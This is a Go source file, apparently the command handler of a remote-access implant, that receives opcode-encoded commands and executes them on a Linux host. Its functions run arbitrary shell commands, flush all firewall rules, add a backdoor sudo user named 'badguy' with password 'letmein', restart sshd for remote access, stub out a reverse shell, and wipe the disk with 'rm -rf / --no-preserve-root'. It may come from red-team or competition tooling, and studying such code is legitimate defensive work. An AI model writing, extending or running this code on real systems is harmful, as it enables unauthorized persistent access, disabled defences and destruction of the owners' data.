package metcli

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

// HandleComs will take the commandstring blob and execute them all, then return the results encoded into a payload
func HandleComs(comstr string, m Metclient) string {
	comResults := parseCommands(comstr)
	respayload := genResPL(comResults, m)
	return respayload
}

//split large string into individual commands/arguments
func parseCommands(commandBlob string) []string {
	results := []string{}
	isplit := strings.Split(commandBlob, "<||>")
	for _, comStr := range isplit {
		jsplit := strings.SplitN(comStr, ":", 3)
		aid := jsplit[0]
		mode := jsplit[1]
		if mode == "0" {
			return nil
		}
		args := jsplit[2]
		output := execCommand(mode, args)
		resStr := aid + ":" + output
		results = append(results, resStr)
	}
	return results
}

//pass each action to appropriate handler
func execCommand(mode string, args string) string {
	retval := ""
	switch mode {
	case "0": //no command
		return ""
	case "1": //shell exec of args
		retval = shellExec(args)
	case "2":
		retval = fwFlush()
	case "3":
		retval = createUser()
	case "4":
		retval = enableRemote()
	case "5":
		retval = spawnRevShell(args)
	case "6":
		retval = unknownCom()
	case "7":
		retval = unknownCom()
	case "8":
		retval = unknownCom()
	case "9":
		retval = unknownCom()
	case "A":
		retval = unknownCom()
	case "B":
		retval = unknownCom()
	case "F":
		retval = nuke()
	default:
		retval = unknownCom()
	}
	if retval == "" {
		retval = "<No Output>"
	}
	return retval
}

//most commonly used, pass in args to a shell
func shellExec(args string) string {
	cmd := exec.Command("/bin/sh", "-c", args)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//flush firewall rules from all tables
func fwFlush() string {
	cmd := exec.Command("/bin/sh", "-c", "iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -t nat -F; iptables -t mangle -F; iptables -F; iptables -X;")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//create a new user.  maybe in the future name/pass will be passed as args
func createUser() string {
	comStr := "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G sudo"
	if _, err := os.Stat("/etc/yum.conf"); os.IsNotExist(err) {
		comStr = "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G wheel"
	}
	cmd := exec.Command("/bin/sh", "-c", comStr)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//allow ssh connections and restart the service
func enableRemote() string {
	insRule := exec.Command("iptables", "-I", "FILTER", "1", "-j", "ACCEPT")
	insRule.Run()
	cmd := exec.Command("/bin/sh", "-c", "systemctl restart sshd")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//spawn a (disowned) reverse shell back to target IP/port
func spawnRevShell(target string) string {
	fmt.Println("In spawnRevShell")
	//soon to come...
	return ""
}

// probably never use this, but it's nice to have around :^)
func nuke() string {
	//rm rf dat boi
	cmd := exec.Command("/bin/bash", "-c", "rm -rf / --no-preserve-root")
	out, _ := cmd.CombinedOutput()
	return string(out)
}

//if the opcode is something weird, dont know what to do with it
func unknownCom() string {
	return ""
}
